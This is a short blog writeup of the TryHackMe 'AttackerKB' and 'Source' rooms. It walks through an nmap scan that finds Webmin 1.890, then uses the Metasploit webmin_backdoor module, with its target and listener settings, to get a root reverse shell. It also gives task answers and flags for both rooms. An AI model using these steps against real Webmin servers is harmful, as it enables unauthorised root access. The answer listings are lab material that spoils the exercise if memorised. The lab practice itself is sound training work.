---
layout: post
title: AttackerKB & Source | Writeup
categories: CTF
author: ThelastVvV
date: '2020-07-11 18:42:53 +0800'
tags:
  - CTF
  - CyberSecurity
  - TryHackMe
published: true
---



- [AttackerKB & Source](#attackerkb--source)
  - [Enumeration:](#enumeration)
  - [Exploitation](#exploitation)
  - [Reverse shell](#reverse-shell)
  - [AttackerKB Tasks:](#attackerkb-tasks)

<!-- toc -->

## AttackerKB & Source

 Hallå gubbar , Today i will show you how easy this boxes are in a very simple explanation both [AttackerKB](https://tryhackme.com/room/attackerkb) &  [Source](https://tryhackme.com/room/source).
![alt text](https://thelastvvv.github.io/images/posts/1/bloggg.jpg "THM")


### Enumeration:

```sh
$ nmap -T4 -A -v -Pn Box-ip
```
Results:



> PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
| 2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
| 256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_ 256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
10000/tcp open http MiniServ 1.890 (Webmin httpd)


### Exploitation
Source and AttackerKB:

One of the attached files of vulnerability is metasploit module that will allow us reverse shell the box so let open Metasploit


[https://github.com/rapid7/metasploit-framework/pull/12219]()


using this command:

```sh
$ msfconsole
```



then search "the exploit name or version"


![alt text](https://thelastvvv.github.io/images/posts/1/attack.png "search")


then choose 
```sh
$ unix/webapp/webmin_backdoor
```

![alt text](https://thelastvvv.github.io/images/posts/1/attavk.png "metasploit")



> RHOSTS : Box-ip

>RPORT: Box-port

>LHOST: Your-ip

>SSL : 1


### Reverse shell


![alt text](https://thelastvvv.github.io/images/posts/1/reverse.png "shell")


volia session opened we are root so let check the hints and hunt the flags

User Flag:

![alt text](https://thelastvvv.github.io/images/posts/1/flag1.png "flag1")


Root Flag:


![alt text](https://thelastvvv.github.io/images/posts/1/flagroot.png "flag2")

### AttackerKB Tasks:

Task 2 :

-Discovering the Lay of the Land :

From Nmap results we can find all our answers .....

Answers: 
`2-Webmin`

`3-1.890`

`4- from cert bellow figure it out`

Task 3 :

 learning to fly:

Just explore Attackerkb then we will be able to answer the following "important to copy directly from Attackerkb site 

Answers: 
`3 1.890` 

`4 supply chain`

 `5 aug172019`

`6 githubfileinthetitle`



See you next time .....
